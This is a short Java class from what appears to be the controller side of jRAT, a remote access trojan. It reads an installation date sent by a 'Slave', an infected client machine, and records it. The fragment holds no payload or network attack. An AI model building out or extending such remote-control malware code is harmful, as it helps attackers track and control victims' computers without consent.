package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet11InitInstallationDate implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String date = slave.readLine();
		slave.setInstallDate(date);
	}

}
